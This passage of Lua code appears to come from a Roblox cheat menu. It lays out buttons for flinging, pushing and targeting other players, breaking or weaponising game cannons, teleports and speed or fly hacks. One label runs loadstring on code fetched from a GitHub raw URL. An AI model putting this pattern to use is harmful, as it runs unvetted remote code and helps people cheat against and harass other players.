Game_Section.BorderSizePixel = 0
Game_Section.Position = UDim2.new(0, 105, 0, 30)
Game_Section.Size = UDim2.new(0, 395, 0, 320)
Game_Section.Visible = false
Game_Section.CanvasSize = UDim2.new(0, 0, 1.85, 0)
Game_Section.ScrollBarThickness = 5

AntiRagdoll_Button.Name = "AntiRagdoll_Button"
AntiRagdoll_Button.Parent = Game_Section
AntiRagdoll_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
AntiRagdoll_Button.BackgroundTransparency = 0.500
AntiRagdoll_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
AntiRagdoll_Button.BorderSizePixel = 0
AntiRagdoll_Button.Position = UDim2.new(0, 25, 0, 25)
AntiRagdoll_Button.Size = UDim2.new(0, 150, 0, 30)
AntiRagdoll_Button.Font = Enum.Font.Oswald
AntiRagdoll_Button.Text = "Anti ragdoll"
AntiRagdoll_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
AntiRagdoll_Button.TextScaled = true
AntiRagdoll_Button.TextSize = 14.000
AntiRagdoll_Button.TextWrapped = true

PotionFling_Button.Name = "PotionFling_Button"
PotionFling_Button.Parent = Game_Section
PotionFling_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PotionFling_Button.BackgroundTransparency = 0.500
PotionFling_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PotionFling_Button.BorderSizePixel = 0
PotionFling_Button.Position = UDim2.new(0, 210, 0, 75)
PotionFling_Button.Size = UDim2.new(0, 150, 0, 30)
PotionFling_Button.Font = Enum.Font.Oswald
PotionFling_Button.Text = "Potion Fling"
PotionFling_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PotionFling_Button.TextScaled = true
PotionFling_Button.TextSize = 14.000
PotionFling_Button.TextWrapped = true

SpamMines_Button.Name = "SpamMines_Button"
SpamMines_Button.Parent = Game_Section
SpamMines_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
SpamMines_Button.BackgroundTransparency = 0.500
SpamMines_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
SpamMines_Button.BorderSizePixel = 0
SpamMines_Button.Position = UDim2.new(0, 25, 0, 75)
SpamMines_Button.Size = UDim2.new(0, 150, 0, 30)
SpamMines_Button.Font = Enum.Font.Oswald
SpamMines_Button.Text = "Spam mines"
SpamMines_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
SpamMines_Button.TextScaled = true
SpamMines_Button.TextSize = 14.000
SpamMines_Button.TextWrapped = true

PushAura_Button.Name = "PushAura_Button"
PushAura_Button.Parent = Game_Section
PushAura_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PushAura_Button.BackgroundTransparency = 0.500
PushAura_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PushAura_Button.BorderSizePixel = 0
PushAura_Button.Position = UDim2.new(0, 210, 0, 25)
PushAura_Button.Size = UDim2.new(0, 150, 0, 30)
PushAura_Button.Font = Enum.Font.Oswald
PushAura_Button.Text = "Push aura"
PushAura_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PushAura_Button.TextScaled = true
PushAura_Button.TextSize = 14.000
PushAura_Button.TextWrapped = true

BreakCannons_Button.Name = "BreakCannons_Button"
BreakCannons_Button.Parent = Game_Section
BreakCannons_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
BreakCannons_Button.BackgroundTransparency = 0.500
BreakCannons_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
BreakCannons_Button.BorderSizePixel = 0
BreakCannons_Button.Position = UDim2.new(0, 25, 0, 225)
BreakCannons_Button.Size = UDim2.new(0, 150, 0, 30)
BreakCannons_Button.Font = Enum.Font.Oswald
BreakCannons_Button.Text = "Break Cannons"
BreakCannons_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
BreakCannons_Button.TextScaled = true
BreakCannons_Button.TextSize = 14.000
BreakCannons_Button.TextWrapped = true

LethalCannons_Button.Name = "LethalCannons_Button"
LethalCannons_Button.Parent = Game_Section
LethalCannons_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
LethalCannons_Button.BackgroundTransparency = 0.500
LethalCannons_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
LethalCannons_Button.BorderSizePixel = 0
LethalCannons_Button.Position = UDim2.new(0, 25, 0, 275)
LethalCannons_Button.Size = UDim2.new(0, 150, 0, 30)
LethalCannons_Button.Font = Enum.Font.Oswald
LethalCannons_Button.Text = "Lethal Cannons"
LethalCannons_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
LethalCannons_Button.TextScaled = true
LethalCannons_Button.TextSize = 14.000
LethalCannons_Button.TextWrapped = true

ChatAlert_Button.Name = "ChatAlert_Button"
ChatAlert_Button.Parent = Game_Section
ChatAlert_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ChatAlert_Button.BackgroundTransparency = 0.500
ChatAlert_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ChatAlert_Button.BorderSizePixel = 0
ChatAlert_Button.Position = UDim2.new(0, 210, 0, 275)
ChatAlert_Button.Size = UDim2.new(0, 150, 0, 30)
ChatAlert_Button.Font = Enum.Font.Oswald
ChatAlert_Button.Text = "Chat alert"
ChatAlert_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ChatAlert_Button.TextScaled = true
ChatAlert_Button.TextSize = 14.000
ChatAlert_Button.TextWrapped = true

PotionDi_Button.Name = "PotionDi_Button"
PotionDi_Button.Parent = Game_Section
PotionDi_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PotionDi_Button.BackgroundTransparency = 0.500
PotionDi_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PotionDi_Button.BorderSizePixel = 0
PotionDi_Button.Position = UDim2.new(0, 210, 0, 125)
PotionDi_Button.Size = UDim2.new(0, 150, 0, 30)
PotionDi_Button.Font = Enum.Font.Oswald
PotionDi_Button.Text = "Potion dick"
PotionDi_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PotionDi_Button.TextScaled = true
PotionDi_Button.TextSize = 14.000
PotionDi_Button.TextWrapped = true

VoidProtection_Button.Name = "VoidProtection_Button"
VoidProtection_Button.Parent = Game_Section
VoidProtection_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
VoidProtection_Button.BackgroundTransparency = 0.500
VoidProtection_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
VoidProtection_Button.BorderSizePixel = 0
VoidProtection_Button.Position = UDim2.new(0, 25, 0, 175)
VoidProtection_Button.Size = UDim2.new(0, 150, 0, 30)
VoidProtection_Button.Font = Enum.Font.Oswald
VoidProtection_Button.Text = "Void protection"
VoidProtection_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
VoidProtection_Button.TextScaled = true
VoidProtection_Button.TextSize = 14.000
VoidProtection_Button.TextWrapped = true

PushAll_Button.Name = "PushAll_Button"
PushAll_Button.Parent = Game_Section
PushAll_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PushAll_Button.BackgroundTransparency = 0.500
PushAll_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PushAll_Button.BorderSizePixel = 0
PushAll_Button.Position = UDim2.new(0, 210, 0, 225)
PushAll_Button.Size = UDim2.new(0, 150, 0, 30)
PushAll_Button.Font = Enum.Font.Oswald
PushAll_Button.Text = "Push all"
PushAll_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PushAll_Button.TextScaled = true
PushAll_Button.TextSize = 14.000
PushAll_Button.TextWrapped = true

TouchFling_Button.Name = "TouchFling_Button"
TouchFling_Button.Parent = Game_Section
TouchFling_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
TouchFling_Button.BackgroundTransparency = 0.500
TouchFling_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
TouchFling_Button.BorderSizePixel = 0
TouchFling_Button.Position = UDim2.new(0, 25, 0, 125)
TouchFling_Button.Size = UDim2.new(0, 150, 0, 30)
TouchFling_Button.Font = Enum.Font.Oswald
TouchFling_Button.Text = "Touch fling"
TouchFling_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
TouchFling_Button.TextScaled = true
TouchFling_Button.TextSize = 14.000
TouchFling_Button.TextWrapped = true

CMDBar.Name = "CMDBar"
CMDBar.Parent = Game_Section
CMDBar.AnchorPoint = Vector2.new(0.5, 0.5)
CMDBar.BackgroundColor3 = Color3.fromRGB(0, 140, 140)
CMDBar.BackgroundTransparency = 0.300
CMDBar.BorderColor3 = Color3.fromRGB(0, 255, 255)
CMDBar.Position = UDim2.new(0.5, 0, 0, 350)
CMDBar.Size = UDim2.new(0, 275, 0, 40)
CMDBar.Font = Enum.Font.Gotham
CMDBar.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
CMDBar.PlaceholderText = "CMD BAR..."
CMDBar.Text = ""
CMDBar.TextColor3 = Color3.fromRGB(20, 20, 20)
CMDBar.TextSize = 14.000
CMDBar.TextWrapped = true

CannonTP1_Button.Name = "CannonTP1_Button"
CannonTP1_Button.Parent = Game_Section
CannonTP1_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
CannonTP1_Button.BackgroundTransparency = 0.500
CannonTP1_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
CannonTP1_Button.BorderSizePixel = 0
CannonTP1_Button.Position = UDim2.new(0, 25, 0, 400)
CannonTP1_Button.Size = UDim2.new(0, 150, 0, 30)
CannonTP1_Button.Font = Enum.Font.Oswald
CannonTP1_Button.Text = "TP Cannon 1"
CannonTP1_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
CannonTP1_Button.TextScaled = true
CannonTP1_Button.TextSize = 14.000
CannonTP1_Button.TextWrapped = true

CannonTP2_Button.Name = "CannonTP2_Button"
CannonTP2_Button.Parent = Game_Section
CannonTP2_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
CannonTP2_Button.BackgroundTransparency = 0.500
CannonTP2_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
CannonTP2_Button.BorderSizePixel = 0
CannonTP2_Button.Position = UDim2.new(0, 210, 0, 400)
CannonTP2_Button.Size = UDim2.new(0, 150, 0, 30)
CannonTP2_Button.Font = Enum.Font.Oswald
CannonTP2_Button.Text = "TP Cannon 2"
CannonTP2_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
CannonTP2_Button.TextScaled = true
CannonTP2_Button.TextSize = 14.000
CannonTP2_Button.TextWrapped = true

CannonTP3_Button.Name = "CannonTP3_Button"
CannonTP3_Button.Parent = Game_Section
CannonTP3_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
CannonTP3_Button.BackgroundTransparency = 0.500
CannonTP3_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
CannonTP3_Button.BorderSizePixel = 0
CannonTP3_Button.Position = UDim2.new(0, 25, 0, 450)
CannonTP3_Button.Size = UDim2.new(0, 150, 0, 30)
CannonTP3_Button.Font = Enum.Font.Oswald
CannonTP3_Button.Text = "TP Cannon 3"
CannonTP3_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
CannonTP3_Button.TextScaled = true
CannonTP3_Button.TextSize = 14.000
CannonTP3_Button.TextWrapped = true

MinefieldTP_Button.Name = "MinefieldTP_Button"
MinefieldTP_Button.Parent = Game_Section
MinefieldTP_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
MinefieldTP_Button.BackgroundTransparency = 0.500
MinefieldTP_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
MinefieldTP_Button.BorderSizePixel = 0
MinefieldTP_Button.Position = UDim2.new(0, 210, 0, 450)
MinefieldTP_Button.Size = UDim2.new(0, 150, 0, 30)
MinefieldTP_Button.Font = Enum.Font.Oswald
MinefieldTP_Button.Text = "TP Minefield"
MinefieldTP_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
MinefieldTP_Button.TextScaled = true
MinefieldTP_Button.TextSize = 14.000
MinefieldTP_Button.TextWrapped = true

BallonTP_Button.Name = "BallonTP_Button"
BallonTP_Button.Parent = Game_Section
BallonTP_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
BallonTP_Button.BackgroundTransparency = 0.500
BallonTP_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
BallonTP_Button.BorderSizePixel = 0
BallonTP_Button.Position = UDim2.new(0, 25, 0, 500)
BallonTP_Button.Size = UDim2.new(0, 150, 0, 30)
BallonTP_Button.Font = Enum.Font.Oswald
BallonTP_Button.Text = "TP Ballon"
BallonTP_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
BallonTP_Button.TextScaled = true
BallonTP_Button.TextSize = 14.000
BallonTP_Button.TextWrapped = true

NormalStairsTP_Button.Name = "NormalStairsTP_Button"
NormalStairsTP_Button.Parent = Game_Section
NormalStairsTP_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
NormalStairsTP_Button.BackgroundTransparency = 0.500
NormalStairsTP_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
NormalStairsTP_Button.BorderSizePixel = 0
NormalStairsTP_Button.Position = UDim2.new(0, 210, 0, 500)
NormalStairsTP_Button.Size = UDim2.new(0, 150, 0, 30)
NormalStairsTP_Button.Font = Enum.Font.Oswald
NormalStairsTP_Button.Text = "TP Stairs"
NormalStairsTP_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
NormalStairsTP_Button.TextScaled = true
NormalStairsTP_Button.TextSize = 14.000
NormalStairsTP_Button.TextWrapped = true

MovingStairsTP_Button.Name = "MovingStairsTP_Button"
MovingStairsTP_Button.Parent = Game_Section
MovingStairsTP_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
MovingStairsTP_Button.BackgroundTransparency = 0.500
MovingStairsTP_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
MovingStairsTP_Button.BorderSizePixel = 0
MovingStairsTP_Button.Position = UDim2.new(0, 25, 0, 550)
MovingStairsTP_Button.Size = UDim2.new(0, 150, 0, 30)
MovingStairsTP_Button.Font = Enum.Font.Oswald
MovingStairsTP_Button.Text = "TP Moving Stairs"
MovingStairsTP_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
MovingStairsTP_Button.TextScaled = true
MovingStairsTP_Button.TextSize = 14.000
MovingStairsTP_Button.TextWrapped = true

SpiralStairsTP_Button.Name = "SpiralStairsTP_Button"
SpiralStairsTP_Button.Parent = Game_Section
SpiralStairsTP_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
SpiralStairsTP_Button.BackgroundTransparency = 0.500
SpiralStairsTP_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
SpiralStairsTP_Button.BorderSizePixel = 0
SpiralStairsTP_Button.Position = UDim2.new(0, 210, 0, 550)
SpiralStairsTP_Button.Size = UDim2.new(0, 150, 0, 30)
SpiralStairsTP_Button.Font = Enum.Font.Oswald
SpiralStairsTP_Button.Text = "TP Spiral Stairs"
SpiralStairsTP_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
SpiralStairsTP_Button.TextScaled = true
SpiralStairsTP_Button.TextSize = 14.000
SpiralStairsTP_Button.TextWrapped = true

SkyscraperTP_Button.Name = "SkyscraperTP_Button"
SkyscraperTP_Button.Parent = Game_Section
SkyscraperTP_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
SkyscraperTP_Button.BackgroundTransparency = 0.500
SkyscraperTP_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
SkyscraperTP_Button.BorderSizePixel = 0
SkyscraperTP_Button.Position = UDim2.new(0, 25, 0, 600)
SkyscraperTP_Button.Size = UDim2.new(0, 150, 0, 30)
SkyscraperTP_Button.Font = Enum.Font.Oswald
SkyscraperTP_Button.Text = "TP Skyscraper"
SkyscraperTP_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
SkyscraperTP_Button.TextScaled = true
SkyscraperTP_Button.TextSize = 14.000
SkyscraperTP_Button.TextWrapped = true

PoolTP_Button.Name = "PoolTP_Button"
PoolTP_Button.Parent = Game_Section
PoolTP_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PoolTP_Button.BackgroundTransparency = 0.500
PoolTP_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PoolTP_Button.BorderSizePixel = 0
PoolTP_Button.Position = UDim2.new(0, 210, 0, 600)
PoolTP_Button.Size = UDim2.new(0, 150, 0, 30)
PoolTP_Button.Font = Enum.Font.Oswald
PoolTP_Button.Text = "TP Pool"
PoolTP_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PoolTP_Button.TextScaled = true
PoolTP_Button.TextSize = 14.000
PoolTP_Button.TextWrapped = true

FreePushTool_Button.Name = "FreePushTool_Button"
FreePushTool_Button.Parent = Game_Section
FreePushTool_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
FreePushTool_Button.BackgroundTransparency = 0.500
FreePushTool_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
FreePushTool_Button.BorderSizePixel = 0
FreePushTool_Button.Position = UDim2.new(0, 210, 0, 175)
FreePushTool_Button.Size = UDim2.new(0, 150, 0, 30)
FreePushTool_Button.Font = Enum.Font.Oswald
FreePushTool_Button.Text = "Modded push"
FreePushTool_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
FreePushTool_Button.TextScaled = true
FreePushTool_Button.TextSize = 14.000
FreePushTool_Button.TextWrapped = true

Home_Section.Name = "Home_Section"
Home_Section.Parent = Background
Home_Section.Active = true
Home_Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Home_Section.BackgroundTransparency = 1.000
Home_Section.BorderColor3 = Color3.fromRGB(0, 0, 0)
Home_Section.BorderSizePixel = 0
Home_Section.Position = UDim2.new(0, 105, 0, 30)
Home_Section.Size = UDim2.new(0, 395, 0, 320)
Home_Section.CanvasSize = UDim2.new(0, 0, 0, 0)
Home_Section.ScrollBarThickness = 5

Profile_Image.Name = "Profile_Image"
Profile_Image.Parent = Home_Section
Profile_Image.BackgroundColor3 = Color3.fromRGB(30,30,30)
Profile_Image.BorderColor3 = Color3.fromRGB(0, 0, 0)
Profile_Image.BorderSizePixel = 0
Profile_Image.Position = UDim2.new(0, 25, 0, 25)
Profile_Image.Size = UDim2.new(0, 100, 0, 100)
Profile_Image.Image = Players:GetUserThumbnailAsync(plr.UserId,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size420x420)

Welcome_Label.Name = "Welcome_Label"
Welcome_Label.Parent = Home_Section
Welcome_Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Welcome_Label.BackgroundTransparency = 1.000
Welcome_Label.BorderColor3 = Color3.fromRGB(0, 0, 0)
Welcome_Label.BorderSizePixel = 0
Welcome_Label.Position = UDim2.new(0, 150, 0, 25)
Welcome_Label.Size = UDim2.new(0, 200, 0, 100)
Welcome_Label.Font = Enum.Font.SourceSans
Welcome_Label.Text = ("¡Hello @"..plr.Name.."!\nPress [B] to open/close gui.")
Welcome_Label.TextColor3 = Color3.fromRGB(0, 255, 255)
Welcome_Label.TextSize = 24.000
Welcome_Label.TextWrapped = true
Welcome_Label.TextXAlignment = Enum.TextXAlignment.Left
Welcome_Label.TextYAlignment = Enum.TextYAlignment.Top

Announce_Label.Name = "Announce_Label"
Announce_Label.Parent = Home_Section
Announce_Label.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Announce_Label.BorderColor3 = Color3.fromRGB(0, 0, 0)
Announce_Label.BorderSizePixel = 0
Announce_Label.Position = UDim2.new(0, 25, 0, 150)
Announce_Label.Size = UDim2.new(0, 350, 0, 150)
Announce_Label.Font = Enum.Font.SourceSans
Announce_Label.Text = loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/announce"))()
Announce_Label.TextColor3 = Color3.fromRGB(0, 255, 255)
Announce_Label.TextSize = 24.000
Announce_Label.TextWrapped = true
Announce_Label.TextXAlignment = Enum.TextXAlignment.Left
Announce_Label.TextYAlignment = Enum.TextYAlignment.Top

Character_Section.Name = "Character_Section"
Character_Section.Parent = Background
Character_Section.Active = true
Character_Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Character_Section.BackgroundTransparency = 1.000
Character_Section.BorderColor3 = Color3.fromRGB(0, 0, 0)
Character_Section.BorderSizePixel = 0
Character_Section.Position = UDim2.new(0, 105, 0, 30)
Character_Section.Size = UDim2.new(0, 395, 0, 320)
Character_Section.Visible = false
Character_Section.CanvasSize = UDim2.new(0, 0, 1, 0)
Character_Section.ScrollBarThickness = 5

WalkSpeed_Button.Name = "WalkSpeed_Button"
WalkSpeed_Button.Parent = Character_Section
WalkSpeed_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
WalkSpeed_Button.BackgroundTransparency = 0.500
WalkSpeed_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
WalkSpeed_Button.BorderSizePixel = 0
WalkSpeed_Button.Position = UDim2.new(0, 25, 0, 25)
WalkSpeed_Button.Size = UDim2.new(0, 150, 0, 30)
WalkSpeed_Button.Font = Enum.Font.Oswald
WalkSpeed_Button.Text = "Walk Speed"
WalkSpeed_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
WalkSpeed_Button.TextScaled = true
WalkSpeed_Button.TextSize = 14.000
WalkSpeed_Button.TextWrapped = true

WalkSpeed_Input.Name = "WalkSpeed_Input"
WalkSpeed_Input.Parent = Character_Section
WalkSpeed_Input.BackgroundColor3 = Color3.fromRGB(0, 140, 140)
WalkSpeed_Input.BackgroundTransparency = 0.300
WalkSpeed_Input.BorderColor3 = Color3.fromRGB(0, 255, 255)
WalkSpeed_Input.Position = UDim2.new(0, 210, 0, 25)
WalkSpeed_Input.Size = UDim2.new(0, 175, 0, 30)
WalkSpeed_Input.Font = Enum.Font.Gotham
WalkSpeed_Input.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
WalkSpeed_Input.PlaceholderText = "Number [1-99999]"
WalkSpeed_Input.Text = ""
WalkSpeed_Input.TextColor3 = Color3.fromRGB(20, 20, 20)
WalkSpeed_Input.TextSize = 14.000
WalkSpeed_Input.TextWrapped = true

ClearCheckpoint_Button.Name = "ClearCheckpoint_Button"
ClearCheckpoint_Button.Parent = Character_Section
ClearCheckpoint_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ClearCheckpoint_Button.BackgroundTransparency = 0.500
ClearCheckpoint_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ClearCheckpoint_Button.BorderSizePixel = 0
ClearCheckpoint_Button.Position = UDim2.new(0, 210, 0, 225)
ClearCheckpoint_Button.Size = UDim2.new(0, 150, 0, 30)
ClearCheckpoint_Button.Font = Enum.Font.Oswald
ClearCheckpoint_Button.Text = "Clear checkpoint"
ClearCheckpoint_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ClearCheckpoint_Button.TextScaled = true
ClearCheckpoint_Button.TextSize = 14.000
ClearCheckpoint_Button.TextWrapped = true

JumpPower_Input.Name = "JumpPower_Input"
JumpPower_Input.Parent = Character_Section
JumpPower_Input.BackgroundColor3 = Color3.fromRGB(0, 140, 140)
JumpPower_Input.BackgroundTransparency = 0.300
JumpPower_Input.BorderColor3 = Color3.fromRGB(0, 255, 255)
JumpPower_Input.Position = UDim2.new(0, 210, 0, 75)
JumpPower_Input.Size = UDim2.new(0, 175, 0, 30)
JumpPower_Input.Font = Enum.Font.Gotham
JumpPower_Input.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
JumpPower_Input.PlaceholderText = "Number [1-99999]"
JumpPower_Input.Text = ""
JumpPower_Input.TextColor3 = Color3.fromRGB(20, 20, 20)
JumpPower_Input.TextSize = 14.000
JumpPower_Input.TextWrapped = true

JumpPower_Button.Name = "JumpPower_Button"
JumpPower_Button.Parent = Character_Section
JumpPower_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
JumpPower_Button.BackgroundTransparency = 0.500
JumpPower_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
JumpPower_Button.BorderSizePixel = 0
JumpPower_Button.Position = UDim2.new(0, 25, 0, 75)
JumpPower_Button.Size = UDim2.new(0, 150, 0, 30)
JumpPower_Button.Font = Enum.Font.Oswald
JumpPower_Button.Text = "Jump power"
JumpPower_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
JumpPower_Button.TextScaled = true
JumpPower_Button.TextSize = 14.000
JumpPower_Button.TextWrapped = true

SaveCheckpoint_Button.Name = "SaveCheckpoint_Button"
SaveCheckpoint_Button.Parent = Character_Section
SaveCheckpoint_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
SaveCheckpoint_Button.BackgroundTransparency = 0.500
SaveCheckpoint_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
SaveCheckpoint_Button.BorderSizePixel = 0
SaveCheckpoint_Button.Position = UDim2.new(0, 210, 0, 175)
SaveCheckpoint_Button.Size = UDim2.new(0, 150, 0, 30)
SaveCheckpoint_Button.Font = Enum.Font.Oswald
SaveCheckpoint_Button.Text = "Save checkpoint"
SaveCheckpoint_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
SaveCheckpoint_Button.TextScaled = true
SaveCheckpoint_Button.TextSize = 14.000
SaveCheckpoint_Button.TextWrapped = true

Respawn_Button.Name = "Respawn_Button"
Respawn_Button.Parent = Character_Section
Respawn_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Respawn_Button.BackgroundTransparency = 0.500
Respawn_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Respawn_Button.BorderSizePixel = 0
Respawn_Button.Position = UDim2.new(0, 25, 0, 225)
Respawn_Button.Size = UDim2.new(0, 150, 0, 30)
Respawn_Button.Font = Enum.Font.Oswald
Respawn_Button.Text = "Respawn"
Respawn_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Respawn_Button.TextScaled = true
Respawn_Button.TextSize = 14.000
Respawn_Button.TextWrapped = true

FlySpeed_Button.Name = "FlySpeed_Button"
FlySpeed_Button.Parent = Character_Section
FlySpeed_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
FlySpeed_Button.BackgroundTransparency = 0.500
FlySpeed_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
FlySpeed_Button.BorderSizePixel = 0
FlySpeed_Button.Position = UDim2.new(0, 25, 0, 125)
FlySpeed_Button.Size = UDim2.new(0, 150, 0, 30)
FlySpeed_Button.Font = Enum.Font.Oswald
FlySpeed_Button.Text = "Fly speed"
FlySpeed_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
FlySpeed_Button.TextScaled = true
FlySpeed_Button.TextSize = 14.000
FlySpeed_Button.TextWrapped = true

FlySpeed_Input.Name = "FlySpeed_Input"
FlySpeed_Input.Parent = Character_Section
FlySpeed_Input.BackgroundColor3 = Color3.fromRGB(0, 140, 140)
FlySpeed_Input.BackgroundTransparency = 0.300
FlySpeed_Input.BorderColor3 = Color3.fromRGB(0, 255, 255)
FlySpeed_Input.Position = UDim2.new(0, 210, 0, 125)
FlySpeed_Input.Size = UDim2.new(0, 175, 0, 30)
FlySpeed_Input.Font = Enum.Font.Gotham
FlySpeed_Input.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
FlySpeed_Input.PlaceholderText = "Number [1-99999]"
FlySpeed_Input.Text = ""
FlySpeed_Input.TextColor3 = Color3.fromRGB(20, 20, 20)
FlySpeed_Input.TextSize = 14.000
FlySpeed_Input.TextWrapped = true

Fly_Button.Name = "Fly_Button"
Fly_Button.Parent = Character_Section
Fly_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Fly_Button.BackgroundTransparency = 0.500
Fly_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Fly_Button.BorderSizePixel = 0
Fly_Button.Position = UDim2.new(0, 25, 0, 175)
Fly_Button.Size = UDim2.new(0, 150, 0, 30)
Fly_Button.Font = Enum.Font.Oswald
Fly_Button.Text = "Fly"
Fly_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Fly_Button.TextScaled = true
Fly_Button.TextSize = 14.000
Fly_Button.TextWrapped = true

Target_Section.Name = "Target_Section"
Target_Section.Parent = Background
Target_Section.Active = true
Target_Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Target_Section.BackgroundTransparency = 1.000
Target_Section.BorderColor3 = Color3.fromRGB(0, 0, 0)
Target_Section.BorderSizePixel = 0
Target_Section.Position = UDim2.new(0, 105, 0, 30)
Target_Section.Size = UDim2.new(0, 395, 0, 320)
Target_Section.Visible = false
Target_Section.CanvasSize = UDim2.new(0, 0, 1.25, 0)
Target_Section.ScrollBarThickness = 5

TargetImage.Name = "TargetImage"
TargetImage.Parent = Target_Section
TargetImage.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TargetImage.BorderColor3 = Color3.fromRGB(0, 255, 255)
TargetImage.Position = UDim2.new(0, 25, 0, 25)
TargetImage.Size = UDim2.new(0, 100, 0, 100)
TargetImage.Image = "rbxassetid://10818605405"

TargetName_Input.Name = "TargetName_Input"
TargetName_Input.Parent = Target_Section
TargetName_Input.BackgroundColor3 = Color3.fromRGB(0, 140, 140)
TargetName_Input.BackgroundTransparency = 0.300
TargetName_Input.BorderColor3 = Color3.fromRGB(0, 255, 255)
TargetName_Input.Position = UDim2.new(0, 150, 0, 30)
TargetName_Input.Size = UDim2.new(0, 175, 0, 30)
TargetName_Input.Font = Enum.Font.Gotham
TargetName_Input.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
TargetName_Input.PlaceholderText = "@target..."
TargetName_Input.Text = ""
TargetName_Input.TextColor3 = Color3.fromRGB(20, 20, 20)
TargetName_Input.TextSize = 14.000
TargetName_Input.TextWrapped = true

ClickTargetTool_Button.Name = "ClickTargetTool_Button"
ClickTargetTool_Button.Parent = TargetName_Input
